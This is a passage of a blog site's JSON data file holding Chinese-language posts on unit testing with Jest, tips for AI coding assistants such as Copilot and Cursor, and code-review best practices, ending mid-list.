expect(total).toBe(30);\\n});\\n```\\n\\n### 3. \u4e00\u4e2a\u6d4b\u8bd5\u4e00\u4e2a\u65ad\u8a00\\n\\n```javascript\\n// \u2705 \u5355\u4e00\u804c\u8d23\\nit(\'validates email format\', () => {\\n  expect(isValidEmail(\'test@example.com\')).toBe(true);\\n});\\n\\nit(\'rejects invalid email\', () => {\\n  expect(isValidEmail(\'invalid\')).toBe(false);\\n});\\n\\n// \u26a0\ufe0f \u591a\u4e2a\u65ad\u8a00\u65f6\u786e\u4fdd\u76f8\u5173\\nit(\'creates user correctly\', () => {\\n  const user = createUser({ name: \'John\', age: 25 });\\n  expect(user.name).toBe(\'John\');\\n  expect(user.age).toBe(25);\\n  expect(user.id).toBeDefined();\\n});\\n```\\n\\n### 4. \u907f\u514d\u6d4b\u8bd5\u5b9e\u73b0\u7ec6\u8282\\n\\n```javascript\\n// \u274c \u6d4b\u8bd5\u5b9e\u73b0\\nit(\'calls internal method\', () => {\\n  const user = new User();\\n  const spy = jest.spyOn(user, \'_privateMethod\');\\n  user.save();\\n  expect(spy).toHaveBeenCalled();\\n});\\n\\n// \u2705 \u6d4b\u8bd5\u884c\u4e3a\\nit(\'saves user to database\', async () => {\\n  const user = new User({ name: \'John\' });\\n  await user.save();\\n  expect(await db.findUser(user.id)).toBeDefined();\\n});\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f React \u6d4b\u8bd5\\n\\n```javascript\\nimport { render, screen, fireEvent } from \'@testing-library/react\';\\nimport Button from \'./Button\';\\n\\ndescribe(\'Button\', () => {\\n  it(\'renders with text\', () => {\\n    render(<Button>Click me</Button>);\\n    expect(screen.getByText(\'Click me\')).toBeInTheDocument();\\n  });\\n\\n  it(\'calls onClick when clicked\', () => {\\n    const handleClick = jest.fn();\\n    render(<Button onClick={handleClick}>Click</Button>);\\n    \\n    fireEvent.click(screen.getByText(\'Click\'));\\n    \\n    expect(handleClick).toHaveBeenCalledTimes(1);\\n  });\\n});\\n```\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u8d44\u6e90\\n\\n- [Jest \u5b98\u65b9\u6587\u6863](https://jestjs.io/)\\n- [Testing Library](https://testing-library.com/)\\n- [Kent C. Dodds Blog](https://kentcdodds.com/blog)\\n\\n---\\n\\n\u6d4b\u8bd5\u662f\u4e00\u79cd\u4e60\u60ef\uff0c\u4ece\u5c0f\u9879\u76ee\u5f00\u59cb\u57f9\u517b\u3002\u5199\u6d4b\u8bd5\u7684\u65f6\u95f4\uff0c\u8fdc\u6bd4\u4fee Bug \u7684\u65f6\u95f4\u5c11\u3002"},{"id":"ai-coding-assistant","metadata":{"permalink":"/blog/ai-coding-assistant","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-06-01-ai-coding.md","source":"@site/blog/2024-06-01-ai-coding.md","title":"AI \u7f16\u7a0b\u52a9\u624b\u4f7f\u7528\u6280\u5de7","description":"AI \u6b63\u5728\u6539\u53d8\u6211\u4eec\u7684\u7f16\u7a0b\u65b9\u5f0f\u3002\u672c\u6587\u5206\u4eab GitHub Copilot\u3001Cursor \u7b49 AI \u7f16\u7a0b\u52a9\u624b\u7684\u9ad8\u6548\u4f7f\u7528\u6280\u5de7\u3002","date":"2024-06-01T00:00:00.000Z","tags":[{"inline":true,"label":"AI","permalink":"/blog/tags/ai"},{"inline":true,"label":"\u6548\u7387","permalink":"/blog/tags/\u6548\u7387"},{"inline":true,"label":"\u5de5\u5177","permalink":"/blog/tags/\u5de5\u5177"}],"readingTime":3.61,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"ai-coding-assistant","title":"AI \u7f16\u7a0b\u52a9\u624b\u4f7f\u7528\u6280\u5de7","authors":"mason","tags":["AI","\u6548\u7387","\u5de5\u5177"]},"unlisted":false,"prevItem":{"title":"\u5355\u5143\u6d4b\u8bd5\u5165\u95e8\u6307\u5357","permalink":"/blog/unit-testing-guide"},"nextItem":{"title":"\u4ee3\u7801\u8bc4\u5ba1\u6700\u4f73\u5b9e\u8df5","permalink":"/blog/code-review"}},"content":"AI \u6b63\u5728\u6539\u53d8\u6211\u4eec\u7684\u7f16\u7a0b\u65b9\u5f0f\u3002\u672c\u6587\u5206\u4eab GitHub Copilot\u3001Cursor \u7b49 AI \u7f16\u7a0b\u52a9\u624b\u7684\u9ad8\u6548\u4f7f\u7528\u6280\u5de7\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83e\udd16 \u4e3b\u6d41 AI \u7f16\u7a0b\u52a9\u624b\\n\\n| \u5de5\u5177 | \u7279\u70b9 | \u9002\u7528\u573a\u666f |\\n|------|------|---------|\\n| **GitHub Copilot** | VS Code \u96c6\u6210\uff0c\u4ee3\u7801\u8865\u5168 | \u65e5\u5e38\u7f16\u7801 |\\n| **Cursor** | AI-first IDE\uff0c\u5bf9\u8bdd\u5f0f\u7f16\u7a0b | \u590d\u6742\u4efb\u52a1 |\\n| **Claude** | \u957f\u4e0a\u4e0b\u6587\uff0c\u4ee3\u7801\u5206\u6790 | \u4ee3\u7801\u5ba1\u67e5 |\\n| **ChatGPT** | \u901a\u7528\u95ee\u7b54 | \u5b66\u4e60\u3001\u8c03\u8bd5 |\\n\\n---\\n\\n## \u2728 GitHub Copilot \u6280\u5de7\\n\\n### 1. \u5199\u597d\u6ce8\u91ca\u5f15\u5bfc\\n\\n```javascript\\n// \u521b\u5efa\u4e00\u4e2a\u9632\u6296\u51fd\u6570\uff0c\u63a5\u6536\u51fd\u6570\u548c\u5ef6\u8fdf\u65f6\u95f4\uff0c\u8fd4\u56de\u9632\u6296\u540e\u7684\u51fd\u6570\\nfunction debounce(fn, delay) {\\n  // Copilot \u4f1a\u6839\u636e\u6ce8\u91ca\u751f\u6210\u4ee3\u7801\\n}\\n\\n// \u53d1\u9001 POST \u8bf7\u6c42\u5230 /api/users\uff0c\u643a\u5e26 JSON \u6570\u636e\\nasync function createUser(userData) {\\n  // ...\\n}\\n```\\n\\n### 2. \u63d0\u4f9b\u4e0a\u4e0b\u6587\\n\\n```typescript\\ninterface User {\\n  id: number;\\n  name: string;\\n  email: string;\\n  createdAt: Date;\\n}\\n\\n// Copilot \u4f1a\u6839\u636e\u63a5\u53e3\u5b9a\u4e49\u751f\u6210\u5339\u914d\u7684\u4ee3\u7801\\nfunction formatUser(user: User): string {\\n  // ...\\n}\\n```\\n\\n### 3. \u4f7f\u7528\u793a\u4f8b\u5f15\u5bfc\\n\\n```javascript\\n// \u8f93\u5165\u793a\u4f8b\uff0c\u5e2e\u52a9 Copilot \u7406\u89e3\u6a21\u5f0f\\nconst users = [\\n  { name: \'John\', age: 25 },\\n  { name: \'Jane\', age: 30 }\\n];\\n\\n// \u6309\u5e74\u9f84\u6392\u5e8f\\nconst sortedUsers = // Copilot \u4f1a\u8865\u5168\\n```\\n\\n### 4. \u5feb\u6377\u952e\\n\\n| \u5feb\u6377\u952e | \u529f\u80fd |\\n|--------|------|\\n| `Tab` | \u63a5\u53d7\u5efa\u8bae |\\n| `Esc` | \u62d2\u7edd\u5efa\u8bae |\\n| `Alt+]` | \u4e0b\u4e00\u4e2a\u5efa\u8bae |\\n| `Alt+[` | \u4e0a\u4e00\u4e2a\u5efa\u8bae |\\n| `Cmd+Enter` | \u6253\u5f00\u5efa\u8bae\u9762\u677f |\\n\\n---\\n\\n## \ud83c\udfaf Cursor \u6280\u5de7\\n\\n### 1. Cmd+K \u5feb\u901f\u7f16\u8f91\\n\\n```javascript\\n// \u9009\u4e2d\u4ee3\u7801\uff0c\u6309 Cmd+K\uff0c\u8f93\u5165\u6307\u4ee4\\n// \\"\u6dfb\u52a0\u9519\u8bef\u5904\u7406\\"\\n// \\"\u8f6c\u6362\u4e3a TypeScript\\"\\n// \\"\u4f18\u5316\u6027\u80fd\\"\\n```\\n\\n### 2. Cmd+L \u5bf9\u8bdd\u6a21\u5f0f\\n\\n```markdown\\n\u5bf9\u8bdd\u793a\u4f8b\uff1a\\n- \\"\u89e3\u91ca\u8fd9\u6bb5\u4ee3\u7801\u7684\u4f5c\u7528\\"\\n- \\"\u5e2e\u6211\u5199\u4e00\u4e2a\u5355\u5143\u6d4b\u8bd5\\"\\n- \\"\u8fd9\u6bb5\u4ee3\u7801\u6709\u4ec0\u4e48\u95ee\u9898\\"\\n- \\"\u5982\u4f55\u91cd\u6784\u8fd9\u4e2a\u51fd\u6570\\"\\n```\\n\\n### 3. @ \u5f15\u7528\\n\\n```markdown\\n@file:src/utils.ts \u5f15\u7528\u6587\u4ef6\\n@folder:src/components \u5f15\u7528\u6587\u4ef6\u5939\\n@web \u641c\u7d22\u7f51\u7edc\\n@docs \u5f15\u7528\u6587\u6863\\n```\\n\\n### 4. Composer \u529f\u80fd\\n\\n```markdown\\n\u7528\u4e8e\u590d\u6742\u4efb\u52a1\uff1a\\n- \\"\u521b\u5efa\u4e00\u4e2a\u767b\u5f55\u9875\u9762\uff0c\u5305\u542b\u8868\u5355\u9a8c\u8bc1\\"\\n- \\"\u5b9e\u73b0\u4e00\u4e2a TODO \u5e94\u7528\uff0c\u4f7f\u7528 React + TypeScript\\"\\n- \\"\u7ed9\u8fd9\u4e2a\u9879\u76ee\u6dfb\u52a0\u5355\u5143\u6d4b\u8bd5\\"\\n```\\n\\n---\\n\\n## \ud83d\udcdd Prompt \u6280\u5de7\\n\\n### 1. \u660e\u786e\u5177\u4f53\\n\\n```markdown\\n# \u274c \u6a21\u7cca\\n\\"\u5199\u4e00\u4e2a\u51fd\u6570\\"\\n\\n# \u2705 \u5177\u4f53\\n\\"\u7528 TypeScript \u5199\u4e00\u4e2a\u51fd\u6570\uff0c\u63a5\u6536\u65e5\u671f\u5b57\u7b26\u4e32\uff08\u683c\u5f0f\uff1aYYYY-MM-DD\uff09\uff0c\\n\u8fd4\u56de\u8be5\u65e5\u671f\u662f\u661f\u671f\u51e0\uff08\u4e2d\u6587\uff09\\"\\n```\\n\\n### 2. \u5206\u6b65\u9aa4\\n\\n```markdown\\n# \u274c \u4e00\u6b21\u6027\u8981\u6c42\u592a\u591a\\n\\"\u5199\u4e00\u4e2a\u5b8c\u6574\u7684\u7528\u6237\u7ba1\u7406\u7cfb\u7edf\\"\\n\\n# \u2705 \u5206\u6b65\u9aa4\\n1. \\"\u8bbe\u8ba1\u7528\u6237\u6570\u636e\u6a21\u578b\\"\\n2. \\"\u5b9e\u73b0\u7528\u6237 CRUD API\\"\\n3. \\"\u6dfb\u52a0\u8ba4\u8bc1\u4e2d\u95f4\u4ef6\\"\\n4. \\"\u7f16\u5199\u5355\u5143\u6d4b\u8bd5\\"\\n```\\n\\n### 3. \u63d0\u4f9b\u4e0a\u4e0b\u6587\\n\\n```markdown\\n# \u2705 \u63d0\u4f9b\u9879\u76ee\u80cc\u666f\\n\\"\u6211\u5728\u4f7f\u7528 Next.js 14 + App Router + Prisma\uff0c\\n\u9700\u8981\u5b9e\u73b0\u4e00\u4e2a\u7528\u6237\u5217\u8868\u9875\u9762\uff0c\u652f\u6301\u5206\u9875\u548c\u641c\u7d22\\"\\n```\\n\\n### 4. \u6307\u5b9a\u683c\u5f0f\\n\\n```markdown\\n# \u2705 \u660e\u786e\u8f93\u51fa\u683c\u5f0f\\n\\"\u7528 Markdown \u8868\u683c\u5217\u51fa React 18 \u7684\u65b0\u7279\u6027\\"\\n\\"\u7528\u4ee3\u7801\u5757\u5c55\u793a\u793a\u4f8b\uff0c\u5e76\u6dfb\u52a0\u6ce8\u91ca\\"\\n```\\n\\n---\\n\\n## \u26a0\ufe0f \u6ce8\u610f\u4e8b\u9879\\n\\n### 1. \u9a8c\u8bc1\u4ee3\u7801\\n\\n```javascript\\n// AI \u751f\u6210\u7684\u4ee3\u7801\u53ef\u80fd\u6709 bug\\n// \u52a1\u5fc5\u6d4b\u8bd5\u548c review\\n\\n// \u274c \u76f4\u63a5\u4f7f\u7528\\n// \u2705 \u7406\u89e3 \u2192 \u6d4b\u8bd5 \u2192 \u4f7f\u7528\\n```\\n\\n### 2. \u5b89\u5168\u610f\u8bc6\\n\\n```javascript\\n// \u274c \u8ba9 AI \u5904\u7406\u654f\u611f\u4fe1\u606f\\n\\"\u5e2e\u6211\u52a0\u5bc6\u8fd9\u4e2a API Key: sk-xxxx...\\"\\n\\n// \u2705 \u4f7f\u7528\u5360\u4f4d\u7b26\\n\\"\u5e2e\u6211\u5199\u4e00\u4e2a\u52a0\u5bc6\u51fd\u6570\uff0c\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u4e2d\u7684 API Key\\"\\n```\\n\\n### 3. \u9690\u79c1\u8003\u8651\\n\\n```markdown\\n- \u4ee3\u7801\u53ef\u80fd\u4e0a\u4f20\u5230\u4e91\u7aef\\n- \u4e0d\u8981\u53d1\u9001\u516c\u53f8\u673a\u5bc6\u4ee3\u7801\\n- \u9075\u5b88\u516c\u53f8 AI \u4f7f\u7528\u653f\u7b56\\n```\\n\\n### 4. \u4fdd\u6301\u5b66\u4e60\\n\\n```markdown\\n- AI \u662f\u52a9\u624b\uff0c\u4e0d\u662f\u66ff\u4ee3\u54c1\\n- \u7406\u89e3\u4ee3\u7801\u539f\u7406\uff0c\u4e0d\u53ea\u662f\u590d\u5236\u7c98\u8d34\\n- \u6301\u7eed\u5b66\u4e60\u65b0\u6280\u672f\\n```\\n\\n---\\n\\n## \ud83c\udfa8 \u5b9e\u7528\u573a\u666f\\n\\n### 1. \u5feb\u901f\u539f\u578b\\n\\n```markdown\\n\\"\u7528 React \u521b\u5efa\u4e00\u4e2a\u5929\u6c14\u5e94\u7528\u7684 UI \u539f\u578b\uff0c\\n\u5305\u542b\u641c\u7d22\u6846\u3001\u5f53\u524d\u5929\u6c14\u5361\u7247\u30017\u5929\u9884\u62a5\u5217\u8868\\"\\n```\\n\\n### 2. \u4ee3\u7801\u89e3\u91ca\\n\\n```markdown\\n\\"\u89e3\u91ca\u8fd9\u6bb5\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u542b\u4e49\uff1a\\n/^(?=.*[a-z])(?=.*[A-Z])(?=.*\\\\d)[a-zA-Z\\\\d]{8,}$/\\"\\n```\\n\\n### 3. Bug \u8c03\u8bd5\\n\\n```markdown\\n\\"\u8fd9\u6bb5\u4ee3\u7801\u8fd0\u884c\u65f6\u62a5\u9519\uff1aCannot read property \'x\' of undefined\\n\u5e2e\u6211\u5206\u6790\u53ef\u80fd\u7684\u539f\u56e0\u548c\u89e3\u51b3\u65b9\u6848\\"\\n```\\n\\n### 4. \u4ee3\u7801\u8f6c\u6362\\n\\n```markdown\\n\\"\u628a\u8fd9\u4e2a JavaScript \u51fd\u6570\u8f6c\u6362\u4e3a TypeScript\uff0c\u6dfb\u52a0\u7c7b\u578b\u5b9a\u4e49\\"\\n\\"\u628a\u8fd9\u4e2a Class \u7ec4\u4ef6\u8f6c\u6362\u4e3a\u51fd\u6570\u7ec4\u4ef6 + Hooks\\"\\n```\\n\\n### 5. \u5355\u5143\u6d4b\u8bd5\\n\\n```markdown\\n\\"\u4e3a\u8fd9\u4e2a\u51fd\u6570\u7f16\u5199 Jest \u5355\u5143\u6d4b\u8bd5\uff0c\u8986\u76d6\u6b63\u5e38\u60c5\u51b5\u548c\u8fb9\u754c\u60c5\u51b5\\"\\n```\\n\\n### 6. \u6587\u6863\u751f\u6210\\n\\n```markdown\\n\\"\u4e3a\u8fd9\u4e2a API \u751f\u6210 JSDoc \u6ce8\u91ca\\"\\n\\"\u751f\u6210 README \u6587\u6863\uff0c\u5305\u542b\u5b89\u88c5\u3001\u4f7f\u7528\u3001API \u8bf4\u660e\\"\\n```\\n\\n---\\n\\n## \ud83d\udcca \u6548\u7387\u5bf9\u6bd4\\n\\n| \u4efb\u52a1 | \u65e0 AI | \u6709 AI | \u63d0\u5347 |\\n|------|-------|-------|------|\\n| \u5199\u6837\u677f\u4ee3\u7801 | 10min | 1min | 10x |\\n| \u8c03\u8bd5\u9519\u8bef | 30min | 5min | 6x |\\n| \u5b66\u4e60\u65b0 API | 1h | 15min | 4x |\\n| \u5199\u5355\u5143\u6d4b\u8bd5 | 20min | 5min | 4x |\\n| \u4ee3\u7801\u91cd\u6784 | 1h | 20min | 3x |\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u8d44\u6e90\\n\\n- [GitHub Copilot \u6587\u6863](https://docs.github.com/copilot)\\n- [Cursor \u6587\u6863](https://cursor.sh/docs)\\n- [Prompt Engineering Guide](https://www.promptingguide.ai/)\\n\\n---\\n\\nAI \u662f\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u4f46\u6700\u7ec8\u4ee3\u7801\u8d28\u91cf\u53d6\u51b3\u4e8e\u4f60\u3002\u5584\u7528 AI\uff0c\u4fdd\u6301\u601d\u8003\uff0c\u6301\u7eed\u6210\u957f\u3002"},{"id":"code-review","metadata":{"permalink":"/blog/code-review","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-05-20-code-review.md","source":"@site/blog/2024-05-20-code-review.md","title":"\u4ee3\u7801\u8bc4\u5ba1\u6700\u4f73\u5b9e\u8df5","description":"Code Review \u662f\u63d0\u5347\u4ee3\u7801\u8d28\u91cf\u548c\u56e2\u961f\u80fd\u529b\u7684\u91cd\u8981\u73af\u8282\u3002\u672c\u6587\u5206\u4eab\u9ad8\u6548\u4ee3\u7801\u8bc4\u5ba1\u7684\u65b9\u6cd5\u548c\u6280\u5de7\u3002","date":"2024-05-20T00:00:00.000Z","tags":[{"inline":true,"label":"\u4ee3\u7801\u8d28\u91cf","permalink":"/blog/tags/\u4ee3\u7801\u8d28\u91cf"},{"inline":true,"label":"\u56e2\u961f\u534f\u4f5c","permalink":"/blog/tags/\u56e2\u961f\u534f\u4f5c"},{"inline":true,"label":"\u6700\u4f73\u5b9e\u8df5","permalink":"/blog/tags/\u6700\u4f73\u5b9e\u8df5"}],"readingTime":3.26,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"code-review","title":"\u4ee3\u7801\u8bc4\u5ba1\u6700\u4f73\u5b9e\u8df5","authors":"mason","tags":["\u4ee3\u7801\u8d28\u91cf","\u56e2\u961f\u534f\u4f5c","\u6700\u4f73\u5b9e\u8df5"]},"unlisted":false,"prevItem":{"title":"AI \u7f16\u7a0b\u52a9\u624b\u4f7f\u7528\u6280\u5de7","permalink":"/blog/ai-coding-assistant"},"nextItem":{"title":"\u6570\u636e\u5e93\u7d22\u5f15\u4f18\u5316\u5b9e\u6218\u6307\u5357","permalink":"/blog/database-index"}},"content":"Code Review \u662f\u63d0\u5347\u4ee3\u7801\u8d28\u91cf\u548c\u56e2\u961f\u80fd\u529b\u7684\u91cd\u8981\u73af\u8282\u3002\u672c\u6587\u5206\u4eab\u9ad8\u6548\u4ee3\u7801\u8bc4\u5ba1\u7684\u65b9\u6cd5\u548c\u6280\u5de7\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4e3a\u4ec0\u4e48\u8981 Code Review\\n\\n| \u6536\u76ca | \u8bf4\u660e |\\n|------|------|\\n| \u53d1\u73b0 Bug | \u591a\u53cc\u773c\u775b\u66f4\u5bb9\u6613\u53d1\u73b0\u95ee\u9898 |\\n| \u77e5\u8bc6\u5206\u4eab | \u56e2\u961f\u6210\u5458\u76f8\u4e92\u5b66\u4e60 |\\n| \u4ee3\u7801\u8d28\u91cf | \u4fdd\u6301\u4ee3\u7801\u98ce\u683c\u4e00\u81f4 |\\n| \u67b6\u6784\u628a\u63a7 | \u9632\u6b62\u8bbe\u8ba1\u8150\u5316 |\\n| \u56e2\u961f\u6210\u957f | \u65b0\u4eba\u5feb\u901f\u878d\u5165 |\\n\\n---\\n\\n## \ud83d\udcdd \u63d0\u4ea4\u8005\u6307\u5357\\n\\n### \u63d0\u4ea4\u524d\u81ea\u68c0\\n\\n```markdown\\n- [ ] \u4ee3\u7801\u80fd\u6b63\u5e38\u8fd0\u884c\\n- [ ] \u5355\u5143\u6d4b\u8bd5\u901a\u8fc7\\n- [ ] \u6ca1\u6709 console.log / debug \u4ee3\u7801\\n- [ ] \u6ca1\u6709\u786c\u7f16\u7801\u7684\u654f\u611f\u4fe1\u606f\\n- [ ] \u4ee3\u7801\u683c\u5f0f\u5316\u8fc7 (Prettier/ESLint)\\n- [ ] \u63d0\u4ea4\u4fe1\u606f\u6e05\u6670\\n```\\n\\n### PR \u63cf\u8ff0\u6a21\u677f\\n\\n```markdown\\n## \u6539\u52a8\u8bf4\u660e\\n\u7b80\u8ff0\u8fd9\u6b21\u6539\u52a8\u505a\u4e86\u4ec0\u4e48\u3001\u4e3a\u4ec0\u4e48\u8981\u505a\\n\\n## \u6539\u52a8\u7c7b\u578b\\n- [ ] \u65b0\u529f\u80fd\\n- [ ] Bug \u4fee\u590d\\n- [ ] \u91cd\u6784\\n- [ ] \u6587\u6863\u66f4\u65b0\\n\\n## \u76f8\u5173\u94fe\u63a5\\n- Issue: #123\\n- \u8bbe\u8ba1\u6587\u6863: [\u94fe\u63a5]\\n\\n## \u6d4b\u8bd5\u8bf4\u660e\\n\u5982\u4f55\u6d4b\u8bd5\u8fd9\u4e2a\u6539\u52a8\\n\\n## \u622a\u56fe (\u5982\u679c\u6709 UI \u6539\u52a8)\\n```\\n\\n### \u4fdd\u6301 PR \u5c0f\u800c\u4e13\u6ce8\\n\\n```bash\\n# \u2705 \u597d\u7684 PR\\n- \u5355\u4e00\u804c\u8d23\uff0c\u53ea\u505a\u4e00\u4ef6\u4e8b\\n- 200-400 \u884c\u6539\u52a8\\n- \u5bb9\u6613\u7406\u89e3\u548c\u8bc4\u5ba1\\n\\n# \u274c \u4e0d\u597d\u7684 PR\\n- \u6df7\u5408\u591a\u4e2a\u529f\u80fd\\n- \u4e0a\u5343\u884c\u6539\u52a8\\n- \u8bc4\u5ba1\u8005\u96be\u4ee5\u7406\u89e3\\n```\\n\\n---\\n\\n## \ud83d\udc40 \u8bc4\u5ba1\u8005\u6307\u5357\\n\\n### \u8bc4\u5ba1\u5173\u6ce8\u70b9\\n\\n```markdown\\n1. **\u6b63\u786e\u6027**\\n   - \u903b\u8f91\u662f\u5426\u6b63\u786e\\n   - \u8fb9\u754c\u60c5\u51b5\u5904\u7406\\n   - \u9519\u8bef\u5904\u7406\\n\\n2. **\u53ef\u8bfb\u6027**\\n   - \u547d\u540d\u662f\u5426\u6e05\u6670\\n   - \u4ee3\u7801\u662f\u5426\u6613\u7406\u89e3\\n   - \u6ce8\u91ca\u662f\u5426\u5fc5\u8981\u4e14\u6709\u7528\\n\\n3. **\u53ef\u7ef4\u62a4\u6027**\\n   - \u662f\u5426\u9075\u5faa\u9879\u76ee\u89c4\u8303\\n   - \u662f\u5426\u6709\u91cd\u590d\u4ee3\u7801\\n   - \u662f\u5426\u8fc7\u5ea6\u8bbe\u8ba1\\n\\n4. **\u6027\u80fd**\\n   - \u662f\u5426\u6709\u660e\u663e\u6027\u80fd\u95ee\u9898\\n   - \u5faa\u73af\u4e2d\u662f\u5426\u6709\u4e0d\u5fc5\u8981\u64cd\u4f5c\\n\\n5. **\u5b89\u5168**\\n   - \u662f\u5426\u6709\u5b89\u5168\u6f0f\u6d1e\\n   - \u654f\u611f\u4fe1\u606f\u5904\u7406\\n```\\n\\n### \u8bc4\u5ba1\u8bc4\u8bba\u89c4\u8303\\n\\n```markdown\\n# \u4f7f\u7528\u6807\u7b7e\u533a\u5206\u4f18\u5148\u7ea7\\n\\n\ud83d\udd34 **\u5fc5\u987b\u4fee\u6539**: \u6709 bug \u6216\u5b89\u5168\u95ee\u9898\\n> \u8fd9\u91cc\u4f1a\u5bfc\u81f4\u7a7a\u6307\u9488\u5f02\u5e38\uff0c\u9700\u8981\u6dfb\u52a0\u5224\u7a7a\\n\\n\ud83d\udfe1 **\u5efa\u8bae\u4fee\u6539**: \u6709\u66f4\u597d\u7684\u5199\u6cd5\\n> \u5efa\u8bae\u4f7f\u7528 Map \u4ee3\u66ff\u5bf9\u8c61\uff0c\u6027\u80fd\u66f4\u597d\\n\\n\ud83d\udd35 **\u7591\u95ee**: \u4e0d\u7406\u89e3\uff0c\u9700\u8981\u89e3\u91ca\\n> \u8fd9\u4e2a\u53d8\u91cf\u540d\u662f\u4ec0\u4e48\u542b\u4e49\uff1f\u80fd\u5426\u6539\u5f97\u66f4\u6e05\u6670\\n\\n\ud83d\udc9a **\u8d5e**: \u5199\u5f97\u597d\\n> \u8fd9\u4e2a\u5c01\u88c5\u5f88\u4f18\u96c5\uff01\u5b66\u5230\u4e86\\n```\\n\\n### \u8bc4\u5ba1\u53cd\u9988\u6280\u5de7\\n\\n```markdown\\n# \u2705 \u597d\u7684\u53cd\u9988\\n\\"\u8fd9\u91cc\u4f7f\u7528 useMemo \u53ef\u4ee5\u907f\u514d\u91cd\u590d\u8ba1\u7b97\uff0c\u53c2\u8003\u6587\u6863\uff1a[\u94fe\u63a5]\\"\\n\\n# \u274c \u4e0d\u597d\u7684\u53cd\u9988\\n\\"\u8fd9\u91cc\u4e0d\u5bf9\\"\\n\\"\u6539\u4e00\u4e0b\\"\\n```\\n\\n---\\n\\n## \u23f1\ufe0f \u8bc4\u5ba1\u6548\u7387\\n\\n### \u65f6\u95f4\u7ba1\u7406\\n\\n```markdown\\n- \u6536\u5230 PR \u540e 24 \u5c0f\u65f6\u5185\u5f00\u59cb\u8bc4\u5ba1\\n- \u6bcf\u6b21\u8bc4\u5ba1\u4e0d\u8d85\u8fc7 1 \u5c0f\u65f6\\n- \u5927 PR \u5206\u591a\u6b21\u8bc4\u5ba1\\n- \u4f7f\u7528\u756a\u8304\u5de5\u4f5c\u6cd5\u96c6\u4e2d\u8bc4\u5ba1\\n```\\n\\n### \u81ea\u52a8\u5316\u8f85\u52a9\\n\\n```yaml\\n# GitHub Actions \u81ea\u52a8\u68c0\u67e5\\n- ESLint / Prettier\\n- \u5355\u5143\u6d4b\u8bd5\\n- \u7c7b\u578b\u68c0\u67e5\\n- \u4f9d\u8d56\u5b89\u5168\u626b\u63cf\\n```\\n\\n---\\n\\n## \ud83d\udd04 \u8bc4\u5ba1\u6d41\u7a0b\\n\\n```\\n1. \u63d0\u4ea4\u8005\u521b\u5efa PR\\n      \u2193\\n2. \u81ea\u52a8\u5316\u68c0\u67e5 (CI)\\n      \u2193\\n3. \u8bc4\u5ba1\u8005 Review\\n      \u2193\\n4. \u63d0\u4ea4\u8005\u4fee\u6539 (\u5982\u9700\u8981)\\n      \u2193\\n5. \u8bc4\u5ba1\u8005 Approve\\n      \u2193\\n6. \u5408\u5e76\u4ee3\u7801\\n```\\n\\n### GitHub \u914d\u7f6e\\n\\n```yaml\\n# \u5206\u652f\u4fdd\u62a4\u89c4\u5219\\n- \u9700\u8981\u81f3\u5c11 1 \u4e2a Approve\\n- \u9700\u8981 CI \u901a\u8fc7\\n- \u9700\u8981\u6700\u65b0\u4ee3\u7801\\n- \u7981\u6b62\u76f4\u63a5 push\\n```\\n\\n---\\n\\n## \ud83d\udccb \u5e38\u89c1\u95ee\u9898 Checklist\\n\\n### JavaScript/TypeScript\\n\\n```markdown\\n- [ ] \u662f\u5426\u6b63\u786e\u5904\u7406 null/undefined\\n- [ ] \u5f02\u6b65\u64cd\u4f5c\u662f\u5426\u6709\u9519\u8bef\u5904\u7406\\n- [ ] \u662f\u5426\u6709\u5185\u5b58\u6cc4\u6f0f\u98ce\u9669\\n- [ ] \u662f\u5426\u6b63\u786e\u4f7f\u7528 TypeScript \u7c7b\u578b\\n```\\n\\n### React\\n\\n```markdown\\n- [ ] \u7ec4\u4ef6\u662f\u5426\u8fc7\u5927\u9700\u8981\u62c6\u5206\\n- [ ] \u662f\u5426\u6b63\u786e\u4f7f\u7528 Hooks \u4f9d\u8d56\\n- [ ] \u662f\u5426\u6709\u4e0d\u5fc5\u8981\u7684\u91cd\u6e32\u67d3\\n- [ ] Key \u662f\u5426\u6b63\u786e\u8bbe\u7f6e\\n```\\n\\n### API\\n\\n```markdown\\n- [ ] \u662f\u5426\u9a8c\u8bc1\u7528\u6237\u8f93\u5165\\n- [ ] \u662f\u5426\u6709\u6743\u9650\u68c0\u67e5\\n- [ ] \u9519\u8bef\u54cd\u5e94\u662f\u5426\u89c4\u8303\\n- [ ] \u662f\u5426\u6709\u6027\u80fd\u95ee\u9898\\n```\\n\\n### \u5b89\u5168\\n\\n```markdown\\n- [ ] \u662f\u5426\u6709 XSS \u98ce\u9669\\n- [ ] \u662f\u5426\u6709 SQL \u6ce8\u5165\u98ce\u9669\\n- [ ] \u654f\u611f\u4fe1\u606f\u662f\u5426\u52a0\u5bc6\\n- [ ] \u662f\u5426\u6709\u786c\u7f16\u7801\u51ed\u8bc1\\n```\\n\\n---\\n\\n## \ud83d\udcac \u6c9f\u901a\u6280\u5de7\\n\\n### \u4f5c\u4e3a\u63d0\u4ea4\u8005\\n\\n```markdown\\n- \u4e3b\u52a8\u63d0\u4f9b\u4e0a\u4e0b\u6587\\n- \u6807\u6ce8\u9700\u8981\u7279\u522b\u5173\u6ce8\u7684\u5730\u65b9\\n- \u53ca\u65f6\u56de\u590d\u8bc4\u8bba\\n- \u611f\u8c22\u8bc4\u5ba1\u8005\u7684\u53cd\u9988\\n```\\n\\n### \u4f5c\u4e3a\u8bc4\u5ba1\u8005\\n\\n```markdown\\n- 